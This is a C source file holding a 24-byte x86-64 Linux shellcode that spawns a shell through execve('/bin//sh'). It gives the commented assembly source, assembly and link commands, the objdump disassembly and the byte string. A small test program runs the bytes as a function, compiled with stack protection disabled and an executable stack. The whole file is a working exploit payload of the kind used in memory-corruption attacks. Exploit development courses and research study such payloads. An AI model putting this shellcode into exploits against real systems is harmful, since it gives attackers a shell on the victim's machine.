//
// shellcode.c
//
// 24 bytes shellcode, that calls execve("/bin//sh")
//
// =========================================
// source:
//
//.text
//    .global _start
//    _start:
//        push %rax                     /* push zero bytes to stack, to mark the end of /bin//sh string on stack */
//        xor %rdx, %rdx                /* envp pointer */
//        xor %rsi, %rsi                /* argv pointer */
//        mov $0x68732f2f6e69622f, %rbx /* /bin//sh ascii codes */
//        push %rbx                     /* push /bin//sh string on the stack */
//        push %rsp                     /* push the pointer to the /bin//sh string on the stack */
//        pop %rdi                      /* "/bin//sh" pointer */
//        mov $59, %al                  /* execve kernel service's index */
//        syscall
//
// =========================================
// compile:
//
// as sh.s -o sh.o
// ld sh.o -o sh
//
// =========================================
// disasm:
//
// objdump -D sh.o
//
//Disassembly of section .text:
//
//0000000000000000 <_start>:
//   0: 50                      push   %rax
//   1: 48 31 d2                xor    %rdx,%rdx
//   4: 48 31 f6                xor    %rsi,%rsi
//   7: 48 bb 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rbx
//   e: 2f 73 68
//  11: 53                      push   %rbx
//  12: 54                      push   %rsp
//  13: 5f                      pop    %rdi
//  14: b0 3b                   mov    $0x3b,%al
//  16: 0f 05                   syscall
//
// =========================================
// 24 bytes shellcode:
//
// \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
//
// =========================================
// test:
//
// gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
//

unsigned char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

void main() {
    int (*ret)() = (int(*)())shellcode;
    ret();
}


















